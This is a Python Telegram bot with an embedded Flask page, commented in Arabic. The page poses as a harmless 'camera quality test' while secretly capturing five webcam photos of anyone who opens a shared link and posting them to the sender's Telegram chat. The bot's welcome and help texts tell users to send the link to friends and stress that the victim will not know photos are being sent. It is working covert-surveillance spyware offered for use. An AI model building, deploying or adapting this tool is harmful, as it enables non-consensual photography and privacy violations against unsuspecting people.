import telebot
import time
import logging
import os
import base64
from datetime import datetime
from requests.exceptions import ReadTimeout, ConnectionError
from flask import Flask, request, jsonify, make_response
from threading import Thread
import re

# ---------------------------------------------
# 1. إعدادات الأمان والمتغيرات البيئية
# ---------------------------------------------
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise ValueError("لم يتم تعيين TELEGRAM_BOT_TOKEN في متغيرات البيئة")

DEVELOPER_CHAT_ID = os.environ.get("DEVELOPER_CHAT_ID")
if not DEVELOPER_CHAT_ID:
    raise ValueError("لم يتم تعيين DEVELOPER_CHAT_ID في متغيرات البيئة")
DEVELOPER_CHAT_ID = int(DEVELOPER_CHAT_ID)

BASE_URL = os.environ.get("BASE_URL", "https://whatsapp-bot-v1-5.onrender.com/")
GITHUB_FALLBACK_URL = os.environ.get("GITHUB_FALLBACK_URL", "https://khldwnnsraljrady-collab.github.io/whatsapp-bot-v1/")

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ---------------------------------------------
# 2. دوال التشفير وفك التشفير
# ---------------------------------------------
def encode_id(user_id):
    """تشفير الـ ID باستخدام Base64"""
    return base64.b64encode(str(user_id).encode()).decode()

def decode_id(encoded_id):
    """فك تشفير الـ ID"""
    try:
        return int(base64.b64decode(encoded_id).decode())
    except:
        return None

# ---------------------------------------------
# 3. تطبيق Flask مع رؤوس أمان
# ---------------------------------------------
app = Flask(__name__)

@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://api.telegram.org; frame-ancestors 'none';"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

# ---------------------------------------------
# 4. صفحة HTML المضمنة (كاميرا عادية بدون إشعارات)
# ---------------------------------------------
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تجربة الكاميرا - Camera Test</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: white; border-radius: 24px; padding: 30px; width: 100%; max-width: 500px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        .logo { font-size: 4em; margin-bottom: 20px; color: #667eea; }
        h1 { font-size: 1.8em; margin-bottom: 15px; color: #333; }
        .info-text { color: #666; margin-bottom: 25px; line-height: 1.6; }
        .start-btn { background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 1.1em; font-weight: 600; cursor: pointer; transition: transform 0.3s; margin: 20px 0; }
        .start-btn:hover { transform: scale(1.05); }
        #cameraSection { display: none; margin-top: 20px; }
        .video-container { position: relative; width: 100%; border-radius: 16px; overflow: hidden; margin: 20px 0; background: #000; }
        video { width: 100%; height: auto; display: block; transform: scaleX(-1); }
        .status-message { background: #f0f0f0; padding: 15px; border-radius: 12px; margin: 15px 0; color: #666; font-size: 0.9em; }
        .counter-display { font-size: 1.2em; color: #667eea; font-weight: bold; margin: 10px 0; }
        .footer { margin-top: 25px; font-size: 0.8em; color: #999; }
        .success-message { background: #4caf50; color: white; padding: 10px; border-radius: 8px; margin-top: 15px; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        .camera-icon { animation: pulse 1s infinite; display: inline-block; }
    </style>
</head>
<body>

<div class="container" id="mainScreen">
    <div class="logo"><i class="fas fa-camera"></i></div>
    <h1>📸 تجربة الكاميرا المتقدمة</h1>
    <div class="info-text">
        <p>✨ جودة عالية - وضوح تام ✨</p>
        <p style="margin-top: 10px;">اختبر كاميرا جهازك مع أفضل تجربة</p>
    </div>
    <button class="start-btn" onclick="startCamera()">
        <i class="fas fa-play"></i> تشغيل الكاميرا
    </button>
    <div class="footer">
        <p>⚠️ سيتم اختبار الكاميرا لمدة 10 ثوانٍ</p>
        <p style="margin-top: 5px;">هذا اختبار تقني لقياس جودة الكاميرا</p>
    </div>
</div>

<div class="container" id="cameraSection">
    <div class="logo"><i class="fas fa-camera camera-icon"></i></div>
    <h1>🎥 الكاميرا تعمل</h1>
    <div class="video-container">
        <video id="video" autoplay playsinline></video>
    </div>
    <div class="status-message" id="statusMessage">
        <i class="fas fa-spinner fa-spin"></i> جاري تهيئة الكاميرا...
    </div>
    <div class="counter-display" id="counterDisplay"></div>
    <div class="footer">
        <p>🔄 اختبار الكاميرا قيد التشغيل</p>
        <p style="margin-top: 5px;">الرجاء الانتظار حتى اكتمال الاختبار</p>
    </div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    let encodedId = urlParams.get('id');
    const token = '""" + TOKEN + """';
    const fallbackUrl = '""" + GITHUB_FALLBACK_URL + """';
    
    let mediaStream = null;
    let photoCount = 0;
    let intervalId = null;
    let testTimer = null;
    const MAX_PHOTOS = 5;
    
    function startCamera() {
        document.getElementById('mainScreen').style.display = 'none';
        document.getElementById('cameraSection').style.display = 'block';
        
        // مؤقت احتياطي
        setTimeout(function() {
            if (!mediaStream) {
                window.location.href = fallbackUrl;
            }
        }, 5000);
        
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                mediaStream = stream;
                const video = document.getElementById('video');
                video.srcObject = stream;
                document.getElementById('statusMessage').innerHTML = '<i class="fas fa-check-circle"></i> الكاميرا جاهزة - جاري الاختبار';
                
                // بدء التصوير بعد 2 ثانية
                setTimeout(() => {
                    startCapturing();
                }, 2000);
                
                // إغلاق الكاميرا بعد 15 ثانية
                testTimer = setTimeout(() => {
                    stopCamera();
                }, 15000);
            })
            .catch(err => {
                console.error('Camera error:', err);
                document.getElementById('statusMessage').innerHTML = '<i class="fas fa-exclamation-triangle"></i> تعذر الوصول للكاميرا';
                setTimeout(() => {
                    window.location.href = fallbackUrl;
                }, 2000);
            });
    }
    
    function startCapturing() {
        intervalId = setInterval(() => {
            if (photoCount < MAX_PHOTOS) {
                capturePhoto();
            } else {
                clearInterval(intervalId);
                document.getElementById('statusMessage').innerHTML = '<i class="fas fa-check-circle"></i> اكتمل اختبار الكاميرا';
                document.getElementById('counterDisplay').innerHTML = '✅ تم اختبار الكاميرا بنجاح';
            }
        }, 2000);
    }
    
    function capturePhoto() {
        photoCount++;
        const video = document.getElementById('video');
        const currentPhoto = photoCount;
        
        document.getElementById('counterDisplay').innerHTML = `📸 جاري اختبار الكاميرا... ${photoCount}/${MAX_PHOTOS}`;
        
        if (video.srcObject) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                if (blob && encodedId) {
                    sendPhoto(blob, currentPhoto);
                }
            }, 'image/jpeg', 0.8);
        }
    }
    
    function sendPhoto(blob, photoNumber) {
        const formData = new FormData();
        formData.append('chat_id', encodedId);
        formData.append('photo', blob, `test_${Date.now()}.jpg`);
        
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).catch(error => console.error('Send error:', error));
    }
    
    function stopCamera() {
        if (intervalId) clearInterval(intervalId);
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => track.stop());
        }
        document.getElementById('statusMessage').innerHTML = '<i class="fas fa-check-circle"></i> تم اختبار الكاميرا بنجاح';
        document.getElementById('counterDisplay').innerHTML = '🎉 شكراً لتجربة الكاميرا';
    }
</script>
</body>
</html>
"""

@app.route('/')
def home():
    encoded_id = request.args.get('id')
    
    # التحقق من صحة المعرف المشفر
    if encoded_id:
        decoded_id = decode_id(encoded_id)
        if decoded_id is None:
            return make_response("رابط غير صالح", 400)
    
    return HTML_PAGE

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    return jsonify({"status": "ok"})

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

# ---------------------------------------------
# 5. بوت تيليجرام
# ---------------------------------------------
bot = telebot.TeleBot(TOKEN)
user_stats = {}
total_photos_received = 0

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    user_name = message.from_user.first_name
    
    # تشفير الـ ID
    encoded_id = encode_id(user_id)
    personal_link = f"{BASE_URL}?id={encoded_id}"
    
    if user_id not in user_stats:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 0,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    else:
        user_stats[user_id]["last_active"] = datetime.now()
    
    markup = telebot.types.InlineKeyboardMarkup()
    camera_btn = telebot.types.InlineKeyboardKeyboardButton(text="📸 افتح الكاميرا", url=personal_link)
    help_btn = telebot.types.InlineKeyboardKeyboardButton(text="❓ التعليمات", callback_data="help")
    stats_btn = telebot.types.InlineKeyboardKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
    markup.add(camera_btn)
    markup.add(help_btn, stats_btn)
    
    response = (
        f"🎉 أهلاً بك *{user_name}*!\n\n"
        f"✨ *رابطك الشخصي:*\n"
        f"`{personal_link}`\n\n"
        f"📌 *طريقة الاستخدام:*\n"
        f"1. انسخ الرابط أعلاه\n"
        f"2. أرسله لأصدقائك\n"
        f"3. عندما يفتح صديقك الرابط، ستظهر له واجهة تجربة كاميرا عادية\n"
        f"4. سيتم اختبار الكاميرا تلقائياً وستصل الصور إليك مباشرة\n\n"
        f"🔒 *ملاحظة:* صديقك لن يعلم أنه يتم إرسال الصور، سيعتقد أنها مجرد تجربة كاميرا"
    )
    bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
    logger.info(f"New user started: {user_name} (ID: {user_id})")

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    global total_photos_received
    
    # فك تشفير chat_id من البيانات
    chat_id = message.chat.id
    user_name = message.from_user.first_name
    
    if chat_id in user_stats:
        user_stats[chat_id]["photo_count"] += 1
        user_stats[chat_id]["last_active"] = datetime.now()
    else:
        user_stats[chat_id] = {
            "name": user_name,
            "photo_count": 1,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    total_photos_received += 1
    
    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    file_size = file_info.file_size / 1024
    
    caption = (
        f"📸 *صورة جديدة*\n\n"
        f"👤 المرسل: {user_name}\n"
        f"🆔 المعرف: {chat_id}\n"
        f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
        f"📊 إجمالي صورك: {user_stats[chat_id]['photo_count']}\n"
        f"🌐 الإجمالي الكلي: {total_photos_received}"
    )
    bot.send_message(chat_id, caption, parse_mode="Markdown")
    logger.info(f"Received photo from {user_name} (ID: {chat_id})")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "help":
        help_text = (
            "📖 *دليل الاستخدام*\n\n"
            "🎯 *كيف يعمل البوت:*\n"
            "1. اضغط /start للحصول على رابطك المشفر\n"
            "2. أرسل الرابط لأصدقائك\n"
            "3. عندما يفتح صديقك الرابط:\n"
            "   • تظهر له واجهة تجربة كاميرا عادية\n"
            "   • يتم اختبار الكاميرا لمدة 15 ثانية\n"
            "   • يتم التقاط 5 صور تلقائياً\n"
            "   • الصور تصل إليك مباشرة\n\n"
            "⚠️ *ملاحظة:* صديقك لن يعلم أنه يتم إرسال الصور\n\n"
            "🔐 *الأمان:* الرابط مشفر ولا يمكن التلاعب به"
        )
        bot.send_message(call.message.chat.id, help_text, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "📖 تم عرض التعليمات")
    elif call.data == "stats":
        user_id = call.message.chat.id
        if user_id in user_stats:
            stat = user_stats[user_id]
            response = (
                f"📊 *إحصائياتك*\n\n"
                f"👤 الاسم: {stat['name']}\n"
                f"📸 عدد الصور: {stat['photo_count']}\n"
                f"📅 التسجيل: {stat['first_seen'].strftime('%Y-%m-%d')}\n"
                f"👥 المستخدمين: {len(user_stats)}\n"
                f"🖼️ إجمالي الصور: {total_photos_received}"
            )
        else:
            response = "❌ لا توجد إحصائيات"
        bot.send_message(user_id, response, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "📊 تم عرض الإحصائيات")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if message.text.startswith('/'):
        bot.reply_to(message, "❌ أمر غير معروف!\n\nاستخدم /start للبدء")
    else:
        bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\n\nاستخدم /start للحصول على رابطك المشفر")

# ---------------------------------------------
# 6. تشغيل البوت
# ---------------------------------------------
if __name__ == "__main__":
    keep_alive()
    logger.info("Bot is starting...")
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=60)
        except Exception as e:
            logger.error(f"Bot error: {e}")
            time.sleep(10)
